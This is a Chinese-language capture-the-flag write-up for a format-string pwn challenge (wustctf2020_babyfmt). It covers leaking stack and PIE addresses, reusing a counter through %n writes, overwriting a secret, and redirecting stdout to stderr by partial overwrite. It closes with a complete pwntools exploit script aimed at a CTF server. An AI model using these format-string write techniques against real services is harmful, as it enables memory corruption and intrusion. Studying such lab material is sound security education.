pwn-WP-格式化字符串
Ev3r

格式化字符串题（看名字，check一下，发现保护全开。。。

直接分析了一下参数。

栈上第8个参数，加上寄存器6个去除格式化字符串一个，所以是第14个参数。测试时候还发现，好像都只能用一次。

看IDA吧。

这里有一个任意地址泄露，但是只能泄露最低字节。可能是个对抗PIE的点。

然后我就开始毫无头绪了，然后又是看wp。

看这个close(1)关闭标准输出流，所以就算输入对了secret也拿不到flag，所以这里要劫持stdout就和之前的重定位一样，劫持**stdout到stderr**，这样在输出流被导入报错流，就可以正常输出了。

除此之外，

asktime函数scanf输入三个数，发现用’+’或者’-‘等绕过，不会改变v1,v2,b3的值 ，所以这个地方可以泄露一些奇妙的东西，可以调试一下得到一些东西。

v2指向一个nop指令（用-号跳过修改）第二张是没有修改的。介于这个地址我们就可以泄露基址了。

代码段的后三位减去就是基址…

所以一次性获得两个地址,栈地址和libc基址.(栈地址就是第一个

然后利用这个基址可以得到stdout 和 stderr的地址

不难发现的是stdout和stderr的间隔是不远的，这样就可以利用partial overwrite去重定向。

然后一样的里一共格式化字符串，改掉secret，就可以去拿到flag了。

那么只剩下一个问题，就是改变a1的值，重复利用了。

不知道师傅们有没有发现。这个赋值是在漏洞函数里的，而且是在printf函数漏洞触发前，那么肯定要在栈中创建一个临时变量的空间，从而我们可以利用这一点，通过格式化字符串改变这个值。

刚好在格式化字符串前面，也就是第7个参数。下面写一下exp

exp

from pwn import *                                                                                 
                                                                                                  
context(log_level = 'debug',arch = 'amd64',os = 'linux')                                          
#sh = process("./wustctf2020_babyfmt")                                                            
sh = remote("node3.buuoj.cn","28174")                                                             
secret_addr = 0x202060                                                                            
                                                                                                  
sh.sendlineafter("tell me the time:",'a')                                                         
sh.recvuntil("ok! time is ")                                                                      
stack_addr = int(sh.recvuntil(':',drop = True),base = 10)                                         
base_addr = int(sh.recvuntil(':',drop = True),base = 10) - 0xbd5 #got from gdb                    
print hex(base_addr)                                                                              
                                                                                                  
stderr_addr = base_addr + 0x202040                                                                
stdout_addr = base_addr + 0x202020                                                                
                                                                                                  
sh.recvuntil(">>")                                                                                
                                                                                                  
for i in range(0,8):                                                                              
    sh.sendlineafter(">>","2")                                                                    
    payload = "%7$lln" + "%10$lln" + "aaa" + p64(base_addr + secret_addr + 8*i)                   
    sh.sendline(payload)                                                                          
                                                                                                  
sh.sendlineafter(">>","1")                                                                        
sh.sendline(p64(stderr_addr + 1))                                                                 
tail = ord(sh.recv(1))                                                                            
print (tail<<8) + 64                                                                              
                                                                                                  
payload = ("%7$lln" + "%" + str((tail<<8)+0x40) + "c" + "%11$hn").ljust(24,"a") + p64(stdout_addr)
sh.sendlineafter(">>","2")                                                                        
sh.sendline(payload)                                                                              
                                                                                                  
sleep(3)                                                                                          
                                                                                                  
sh.sendlineafter(">>","3")                                                                        
sh.send('\x00'*0x40)                                                                              
                                                                                                  
sh.interactive()
